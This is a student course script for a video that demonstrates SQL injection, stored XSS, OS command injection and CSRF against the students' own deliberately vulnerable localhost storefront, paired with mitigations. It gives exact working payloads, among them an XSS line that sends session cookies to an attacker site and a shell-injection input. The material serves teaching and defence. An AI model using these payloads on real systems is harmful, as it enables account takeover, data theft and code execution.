# Northwind Supply — Web Server Security Video Script

**Course:** Cyber Security (IT-30001), Autumn 2026  
**Assignment:** Exploitation and Mitigation of Four Vulnerability Categories  
**Target runtime:** about 20 minutes (intro + five 3–4 minute member sections + close)

This script covers every item required by Table 2 of the assignment:

- **(a)** vulnerable implementation and the exact code path
- **(b)** a working exploit with the exact payload/request
- **(c)** the root cause
- **(d)** one implemented mitigation, with the same payload failing
- **(e)** the other mitigation alternatives from the lecture, in theory

Each presenter must record and narrate their own section. Replace `User 1` … `User 5` with the actual member names before recording.

---

## Ownership declaration

Complete the name and roll-number columns before submission. The variant allocation below matches the five code paths currently in the application.

| User | Member name | Roll number | Category | Variant implemented | Protection ID |
|---|---|---|---|---|---|
| User 1 |  |  | SQL Injection | Authentication bypass | `sqli_auth` |
| User 2 |  |  | SQL Injection | UNION-based data extraction | `sqli_union` |
| User 3 |  |  | Cross-Site Scripting (XSS) | Stored XSS | `xss` |
| User 4 |  |  | OS Command Injection | In-band command output | `cmdi` |
| User 5 |  |  | Cross-Site Request Forgery (CSRF) | GET-based forged action | `csrf` |

Because the group has five members, SQL injection is split between two members using its two different variants. Between the five sections, all four vulnerability categories are covered.

---

## Recording setup

Run everything from the repository root. Use only `localhost`; never test against any system outside this project.

```bash
npm install
npm run build
node server/index.js
```

The default is the intentionally vulnerable build. `npm run demo` also works for the first run, but after the build exists, `node server/index.js` is faster for the repeated restarts needed in the video.

Keep these windows/tabs ready:

1. **Terminal** — visible in the recording, large font, repo root.
2. **Code editor** — `server/index.js`, `server/attacker.js`, `client/src/pages/Product.jsx`.
3. **Storefront tab** — `http://localhost:3000`
4. **Companion site tab** — `http://localhost:4000` and `http://localhost:4000/ops`

Use `localhost` consistently in every URL. In particular, do not open the storefront as `127.0.0.1` during the CSRF demo: the session cookie and PerkPoint's default target must use the same host for the forged request to carry the session.

Useful resets:

- Stopping and starting the server reseeds the in-memory database, so balances, reviews and sessions return to a clean state.
- Use a fresh incognito window, or clear the `northwind_session` cookie, between takes so the browser does not hold an old session.
- Clear the PerkPoint campaign inbox from `/ops` before the XSS take.
- For each member's mitigation take, restart the server with only that member's protection enabled. This keeps all other code paths vulnerable as required by the assignment.

```bash
# vulnerable run
node server/index.js

# one mitigation only
PROTECTED=sqli_auth node server/index.js
PROTECTED=sqli_union node server/index.js
PROTECTED=xss node server/index.js
PROTECTED=cmdi node server/index.js
PROTECTED=csrf node server/index.js

# everything protected (optional final shot)
PROTECTED=all node server/index.js
```

**Recording tip:** show a short terminal shot of each restart. That makes it clear the mitigation is actually enabled, not just described.

---

## Opening — group introduction (0:00–0:50)

**[Slide: project title, group members, ownership table.]**

> Hello, we are Group ___. This is our demonstration for the Web Server Security assignment. Our application is **Northwind Supply**, a small B2B storefront built with Node.js, Express, React and an in-memory SQLite database. The companion site on port 4000, **PerkPoint**, plays the role of a third-party rewards partner.
>
> The application is intentionally vulnerable by default. Each of us owns one variant. User 1 and User 2 cover the two SQL injection variants, User 3 covers stored XSS, User 4 covers in-band OS command injection, and User 5 covers GET-based CSRF. Between us, we cover all four vulnerability categories.
>
> Every test in this video runs on `localhost`. For each section, we first show the vulnerable code and the working exploit, then restart the server with only that one mitigation enabled and run the same payload again. We also explain the other mitigation options from the lecture in theory.

---

# User 1 — SQL Injection: Authentication Bypass

**Protection ID:** `sqli_auth`  
**Target:** 3:45  
**Demo path:** `/login` → `/admin`

### Before recording

Start the vulnerable server:

```bash
node server/index.js
```

Have `server/index.js` open at the login route, around lines 74–89. Log out of any existing session first.

### Timed script

**[0:00–0:30] Show the application and the vulnerable entry point.**

> Hi, I am User 1. I own the SQL injection authentication-bypass variant. The target is the sign-in form at `/login`. The browser sends the username and password to `POST /api/auth/login`.

**[0:30–1:15] Show the vulnerable code. Highlight line 84.**

> Here is the vulnerable implementation in `server/index.js`. On line 84, the server builds the SQL query by directly inserting the username and password into a string:
>
> ```js
> const sql = `SELECT id, username, role, email, balance FROM users
>              WHERE username = '${username}' AND password = '${password}'`;
> ```
>
> The user input is concatenated into SQL syntax. The database has no way to tell which characters came from the application and which came from the user. That is the flaw: data becomes code.

**[1:15–1:55] Run the exploit.**

> I want to sign in as the administrator, but I do not know the password. In the username field I enter:
>
> ```text
> admin'--
> ```
>
> In the password field I enter any value, for example `x`. The single quote closes the username string. The two hyphens start a SQL comment, so the rest of the query — including the password check — is ignored. The query becomes:
>
> ```sql
> SELECT ... FROM users WHERE username = 'admin'--' AND password = 'x'
> ```
>
> SQLite returns the administrator row. **[Submit and pause on the Operations dashboard.]** We are now signed in as `admin`, without knowing the administrator password. The dashboard and the diagnostics page are both available, which proves this is an admin session.

**[1:55–2:35] Root cause.**

> The root cause is string concatenation: untrusted input is treated as part of the SQL statement. The quote changes the query structure, and `--` removes the password condition. This is not a password-guessing attack; the password check is bypassed completely. The same pattern would also allow a less targeted payload such as `' OR 1=1--`, which returns the first user in the table. Using `admin'--` makes the impact obvious because it lands directly in the operations area.

**[2:35–3:15] Implemented mitigation.**

**[Stop the server with Ctrl+C. Restart with `PROTECTED=sqli_auth node server/index.js`.]**

> The implemented fix is a parameterised query. In protected mode, the code on lines 81–82 uses placeholders:
>
> ```js
> const sql = 'SELECT id, username, role, email, balance FROM users
>              WHERE username = ? AND password = ?';
> user = db.prepare(sql).get(username, password);
> ```
>
> The SQL text is fixed first, and the values are sent separately to the database driver. The quote in `admin'--` can only be data; it cannot terminate the string or start a comment. **[Reload the login page and try the same payload again.]** The response is `Incorrect username or password`, and no session is created. **[Pause on the error; capture this frame.]** The legitimate login with `admin` and the real password still works.

**[3:15–3:45] Other mitigations — theory.**

> The other options from the lecture are also useful as defence in depth. Strict allow-list validation on the username would reject characters such as quotes and hyphens before the query runs. A least-privilege database account would limit what a successful injection could read or change. Safe error handling returns a generic message instead of leaking SQL details. Parameterisation is the strongest structural fix here because it removes the boundary between code and data entirely.

---

# User 2 — SQL Injection: UNION-Based Data Extraction

**Protection ID:** `sqli_union`  
**Target:** 3:45  
**Demo path:** `/catalog?q=...`

### Before recording

Start the vulnerable server again:

```bash
node server/index.js
```

Have `server/index.js` open at the catalog route, around lines 127–143.

### Timed script

**[0:00–0:30] Show the feature.**

> Hi, I am User 2. I own the second SQL injection variant: UNION-based data extraction. The target is the catalog search on `/catalog`. The search box sends the `q` parameter to `GET /api/products`, and the server returns matching products.

**[0:30–1:15] Show the vulnerable code. Highlight line 136.**

> On line 136, the query is built by concatenating `q` three times:
>
> ```js
> const sql = `SELECT id, name, description, price FROM products
>              WHERE name LIKE '%${q}%'
>              OR description LIKE '%${q}%'
>              OR category LIKE '%${q}%'`;
> rows = db.prepare(sql).all();
> ```
>
> This is the same root cause as the login bypass: user input is pasted directly into SQL. But this time I am not trying to change the login logic. I want to append a second result set and read data from another table.

**[1:15–2:10] Run the exploit.**

> The original query returns four columns: `id`, `name`, `description` and `price`. A UNION query must return the same number of columns, so my payload also selects four columns. In the catalog search I enter:
>
> ```sql
> ' UNION SELECT id, username, password, balance FROM users--
> ```
>
> The leading quote closes the `LIKE` string. `UNION` appends the user rows to the product rows. The final `--` comments out the rest of the original query, including the other two `LIKE` clauses. **[Submit the search.]** The catalog now shows thirteen results: the eight real products, plus five rows from the `users` table.
>
> **[Point to the cards.]** The product cards are displaying `alice`, `alice123`, `$5,000.00`; `admin`, `S3cr3tAdm1n!`, `$99,999.00`; and the other accounts. The UI has no idea these are not products — it simply renders whatever rows the query returned. This is a full disclosure of usernames, plaintext passwords and store-credit balances.

**[2:10–2:40] Root cause.**

> The root cause is that the search term is part of the SQL text, not a bound value. There is no column-count restriction, no allow-list for search syntax and no least-privilege separation between product data and account data. The database is happy to combine both tables because the application's query gives it permission to do so.

**[2:40–3:20] Implemented mitigation.**

**[Stop the server. Restart with `PROTECTED=sqli_union node server/index.js`.]**

> The implemented fix is again a parameterised query. In protected mode, lines 131–134 use placeholders and pass the same `LIKE` value three times:
>
> ```js
> const sql = 'SELECT id, name, description, price FROM products
>              WHERE name LIKE ? OR description LIKE ? OR category LIKE ?';
> const like = `%${q}%`;
> rows = db.prepare(sql).all(like, like, like);
> ```
>
> **[Reload the catalog page with the identical UNION payload, or press Clear and search again.]** The query now searches for the literal text of the payload. It returns zero products, and the user rows never appear. **[Capture the empty result.]** A normal search such as `keyboard` still returns the keyboard, so functionality is preserved.

**[3:20–3:45] Other mitigations — theory.**

> The other options are input validation with a strict search allow-list, a least-privilege read-only database account that cannot see the `users` table, and safe error handling that does not reveal query structure. A web application firewall could block common UNION patterns, but it is only a supplement because encodings and query variations can evade signatures. Parameterisation plus least privilege is the reliable combination.

---

# User 3 — Stored Cross-Site Scripting (XSS)

**Protection ID:** `xss`  
**Target:** 4:00  
**Demo path:** product reviews → PerkPoint inbox → session replay

### Before recording

Start the vulnerable server:

```bash
node server/index.js
```

Open `server/index.js` at the review route, lines 156–175, and `client/src/pages/Product.jsx` at lines 159–163. Clear the PerkPoint inbox from `http://localhost:4000/ops`. Log in as `alice` / `alice123` in the storefront. Keep the PerkPoint ops page ready in another tab.

### Timed script

**[0:00–0:35] Show the feature and the vulnerable sink.**

> Hi, I am User 3. I own the stored XSS variant. Northwind lets members publish reviews on product pages. The server stores the review text in the `reviews` table, and the product page renders it for every later visitor. The seed data even contains a review with `<b>` tags, because the page intentionally supports rich formatting.

**[0:35–1:15] Show the vulnerable code.**

> In `POST /api/products/:id/reviews`, the server checks the length and rating but does not sanitise or encode the review content before storing it. On the client side, `Product.jsx` lines 159–163 render the stored value with React's `dangerouslySetInnerHTML`:
>
> ```jsx
> <div className="review-body injected"
>      dangerouslySetInnerHTML={{ __html: review.content }} />
> ```
>
> That tells React to treat the stored string as HTML. The server's `renderRichText` flag is true in vulnerable mode. The root cause is output rendered without context-aware encoding, combined with a stored data source. The session cookie is also deliberately not `HttpOnly` in this demo so we can show the full impact of script execution.

**[1:15–2:20] Run the exploit.**

> I open the first product and write a review. The exact payload is:
>
> ```html
> <img src=x onerror="fetch('http://localhost:4000/collect?data='+encodeURIComponent(document.cookie))">
> ```
>
> The image source is invalid, so the browser fires `onerror`. That handler reads `document.cookie`, which contains the `northwind_session` cookie, and sends it to the PerkPoint server on port 4000. **[Publish the review.]**
>
> **[Point to the Network tab or PerkPoint ops inbox.]** The review reloads and the payload executes immediately. In the Network tab we can see a request to `http://localhost:4000/collect?data=northwind_session=...`. The request succeeds, and the attacker's server stores the cookie. This is stored XSS: the script is in the database, so it runs for every visitor to this product, not just for the person who submitted it.

**[2:20–2:50] Show the impact.**

> **[Open `http://localhost:4000/ops` and refresh the inbox.]** The campaign inbox now contains the captured cookie. Clicking **Use session** sends that cookie to `/api/auth/me` on the storefront. **[Show the result.]** The request is accepted and returns Alice's authenticated profile. The attacker now has Alice's session without knowing her password. That is why XSS is a session-compromise issue, not just a cosmetic pop-up.

**[2:50–3:30] Implemented mitigation.**

**[Stop the server. Restart with `PROTECTED=xss node server/index.js`.]**

> The implemented fix is safe output encoding: treat review content as text, not HTML, unless it has been through a sanitiser. In protected mode the API returns `renderRichText: false`, and `Product.jsx` renders the review through the normal text path. **[Log in again and re-submit the same payload.]** The payload is now displayed literally as `<img ...>` characters. The browser does not create an image element, `onerror` never runs, and there is no request to PerkPoint. **[Show the inbox still empty and capture this frame.]**

**[3:30–4:00] Other mitigations — theory.**

> The other mitigations from the lecture are complementary. A sanitiser for rich HTML would allow safe tags such as `<b>` while removing event handlers and dangerous elements. A strict Content Security Policy could block inline event handlers and scripts from unapproved origins. Setting the session cookie to `HttpOnly` would stop JavaScript from reading it, so XSS could not steal the session even if script execution occurred. Framework auto-escaping and safe DOM sinks — using `textContent` instead of `innerHTML` — prevent the same mistake elsewhere. For this feature, output encoding plus a sanitiser is the right combination if rich formatting is required.

---

# User 4 — OS Command Injection: In-Band Output

**Protection ID:** `cmdi`  
**Target:** 3:45  
**Demo path:** `/admin/diagnostics`

### Before recording

Start the vulnerable server:

```bash
node server/index.js
```

Open `server/index.js` at `runShell` and the diagnostics route, lines 256–294. Log in as `admin` / `S3cr3tAdm1n!` so the operations tools are available.

### Timed script

**[0:00–0:30] Show the feature.**

> Hi, I am User 4. I own the in-band OS command injection variant. Northwind's operations area has a network diagnostics page. The administrator enters a hostname, and the server runs a single `ping` to check outbound connectivity.

**[0:30–1:15] Show the vulnerable code.**

> The route on line 293 does this:
>
> ```js
> res.json(await runShell(`ping -c 1 ${host}`));
> ```
>
> `runShell` is implemented with Node's `exec`, which starts a shell. On lines 259–260 the complete command string is passed to that shell:
>
> ```js
> exec(command, { timeout: 5000, maxBuffer: 1024 * 1024 }, ...)
> ```
>
> The hostname is concatenated directly into the command. The shell does not see a hostname as a value; it sees the entire string as shell syntax. That is the root cause: user input is interpreted by a command interpreter.

**[1:15–2:00] Run the exploit.**

> The `ping` command accepts a hostname. I enter:
>
> ```text
> 127.0.0.1; whoami; id
> ```
>
> The semicolon ends the `ping` command. The shell then runs `whoami` and `id` as separate commands. **[Run the check.]** The result panel shows the normal ping output plus the operating-system user and group information. Because the output is returned in the same HTTP response, this is in-band command injection. We could replace those commands with anything the server process is allowed to run, such as reading files or making outbound requests.

**[2:00–2:30] Root cause and scope.**

> The command is built by string interpolation, so shell metacharacters are active. This is more severe than simple argument injection because the attacker controls command boundaries. The route is admin-only, so the immediate exposure is an insider or a compromised admin account. But that does not make it safe: the auth-bypass variant from User 1 can produce an admin session, and any future bug that grants admin access would turn into remote code execution. Defence in depth means the diagnostics tool should still be safe even for administrators.

**[2:30–3:15] Implemented mitigation.**

**[Stop the server. Restart with `PROTECTED=cmdi node server/index.js`.]**

> The implemented fix is to avoid the shell by using an argument vector. In protected mode the route uses `execFile`:
>
> ```js
> execFile('ping', ['-c', '1', host], ...)
> ```
>
> `execFile` does not invoke a shell, so `;`, `&&`, backticks and pipes are ordinary characters in the hostname argument. As defence in depth, the route also keeps a strict hostname format check and rejects `..`. **[Log in again as admin and submit the same payload.]** The server returns `Enter a valid hostname or IP address` and runs nothing. **[Show `127.0.0.1` succeeding.]** A legitimate check still works. Capture both frames: blocked payload and successful normal check.

**[3:15–3:45] Other mitigations — theory.**

> The lecture alternatives are to avoid the shell entirely, use parameterised execution with an argument vector, apply a strict allow-list, and run the service with least privilege. Least privilege means an unprivileged account, a container with a read-only filesystem where possible, and no unnecessary credentials or network access. Input validation helps, but it is not a substitute for removing the shell; an allow-list can be bypassed if it is too broad. The strongest fix is the argument-vector execution plus least privilege.

---

# User 5 — CSRF: GET-Based Forged Action

**Protection ID:** `csrf`  
**Target:** 4:00  
**Demo path:** PerkPoint → `/api/account/transfer?to=mallory&amount=500`

### Before recording

Start the vulnerable server:

```bash
node server/index.js
```

Open `server/index.js` at the transfer route, lines 189–199, and `server/attacker.js` at lines 107–130. Log in as `alice` / `alice123`. Note Alice's starting balance, `$5,000`. Open `http://localhost:4000/ops` in another tab so the forged request can be shown.

**Important for a clean take:** the PerkPoint page fires the forged request automatically when it loads. Do **not** click **Claim my reward** or refresh the page, because either action sends another transfer. Let the page load once and show that the status changes without any click.

### Timed script

**[0:00–0:35] Show the victim state.**

> Hi, I am User 5. I own the GET-based CSRF variant. Alice is signed in to Northwind. Her account page shows a store-credit balance of five thousand dollars. In the same browser, she can visit the independent PerkPoint rewards site on port 4000. The attacker controls PerkPoint.

**[0:35–1:20] Show the vulnerable code.**

> The transfer endpoint in `server/index.js` is registered with `app.all`:
>
> ```js
> app.all('/api/account/transfer', requireAuth, (req, res) => {
>   const source = { ...req.query, ...(req.body || {}) };
> ```
>
> `app.all` accepts GET as well as POST, and in vulnerable mode there is no CSRF-token check. The route reads the recipient and amount from the query string. The attacker page contains this image request:
>
> ```js
> const forgedUrl = target + '/api/account/transfer?to=mallory&amount=500&source=perkpoint';
> const img = new Image();
> img.src = forgedUrl;
> ```
>
> The browser attaches the `northwind_session` cookie automatically because it is a request to the storefront. The attacker never sees the cookie and never needs Alice's password. The root cause is a state-changing request accepted without proof of intent — here, a GET with no anti-CSRF token.

**[1:20–2:15] Run the exploit.**

> **[Open `http://localhost:4000`.]** As soon as the page loads, the image request is sent. The page says “Checking your membership…” and then “Membership confirmed” without any user action. That is the forged transfer. The attacker page and the storefront are both on `localhost`, on different ports; `SameSite=Lax` does not separate ports, so the session cookie is sent. Even cross-site, a top-level GET can carry a Lax cookie.
>
> **[Return to the Northwind account page and refresh.]** Alice's balance is now `$4,500`, and recent activity shows a transfer of `$500` to `mallory`. She never filled in the transfer form and never saw a confirmation prompt. **[Open `/ops`.]** The operations console shows the forged GET and the packet using Alice's session. Capture this frame.

**[2:15–2:50] Impact and root cause.**

> This is a zero-click financial action. Any page Alice visits while logged in can trigger it. The request is authenticated by her cookie, but nothing proves she intended it. The balance change is the proof. The root cause is the state-changing GET, the missing token, and automatic cookie attachment.

**[2:50–3:35] Implemented mitigation.**

**[Stop the server. Restart with `PROTECTED=csrf node server/index.js`.]**

> The implemented fix is a synchroniser token. In protected mode the route requires `POST` and compares the `x-csrf-token` header with the token stored in the server-side session:
>
> ```js
> if (req.method !== 'POST' || !token || token !== req.session.csrfToken) {
>   return res.status(403).json({ error: 'This request could not be verified...' });
> }
> ```
>
> The token is returned to the legitimate frontend in the session response and held in memory. The attacker page cannot read it because it is a different origin, and the token is not stored in a cookie. **[Log in again, open PerkPoint, and show the account balance unchanged.]** The forged page still claims success because a failed image load looks the same to it, but the transfer returns `403` and Alice still has `$5,000`. **[Show DevTools Network with the 403, or run the forged URL with curl.]** Then perform a legitimate transfer through the account form; the UI sends the token and the transfer succeeds. That shows the protection does not break normal use.

**[3:35–4:00] Other mitigations — theory.**

> The other CSRF mitigations from the lecture are `SameSite=Strict` cookies, re-authentication for sensitive actions, avoiding state-changing GET requests, and checking `Origin` or `Referer`. `SameSite` reduces cross-site sending but is not a complete fix, especially for same-site deployments or older browsers. Re-authentication is strong for high-value actions but adds friction. The synchroniser token is the primary defence here because it proves the request came from the application's own page. POST-only plus the token is the combination implemented in this build.

---

## Closing — summary and cleanup (about 0:45)

**[Show a slide with the four categories and the five protection IDs. Then show `PROTECTED=all node server/index.js` running.]**

> That completes our demonstration. We showed five variants across all four required categories: SQL injection authentication bypass, SQL injection UNION extraction, stored XSS, in-band OS command injection, and GET-based CSRF. For every variant we showed the vulnerable code, a working payload, the root cause, one implemented mitigation with the same payload failing, and the alternative mitigations in theory.
>
> The protection switches are server-side only: `PROTECTED=sqli_auth`, `sqli_union`, `xss`, `cmdi`, `csrf`, or `all` for the fully hardened build. The source, ownership declaration and run instructions are in the repository. All testing was performed only against our own local application.

---

## Quick reference — payloads and expected evidence

| User | Payload / request | Vulnerable result | Protected result |
|---|---|---|---|
| User 1 | Username `admin'--`, password `x` | Signed in as admin | `Incorrect username or password` |
| User 2 | `' UNION SELECT id, username, password, balance FROM users--` | User credentials appear as product cards | Zero products; literal search |
| User 3 | `<img src=x onerror="fetch('http://localhost:4000/collect?data='+encodeURIComponent(document.cookie))">` | Cookie sent to PerkPoint; session replay works | Payload rendered as text; no callback |
| User 4 | `127.0.0.1; whoami; id` | Ping output plus local OS user | `Enter a valid hostname or IP address`; nothing executes |
| User 5 | `GET /api/account/transfer?to=mallory&amount=500&source=perkpoint` | $500 moved from Alice to Mallory | `403`; balance unchanged; legitimate POST with token works |

## Evidence checklist for submission

- [ ] User 1: screenshot of admin dashboard after passwordless login, then blocked login error
- [ ] User 2: screenshot of user passwords in the catalog, then empty protected search
- [ ] User 3: screenshot of the PerkPoint inbox with the captured cookie and the replayed session, then literal-text rendering with no callback
- [ ] User 4: screenshot of `whoami`/`id` output in the diagnostics console, then blocked payload and working `127.0.0.1`
- [ ] User 5: screenshot of Alice's balance dropping by $500, then the 403 and unchanged balance, plus a legitimate token-protected transfer
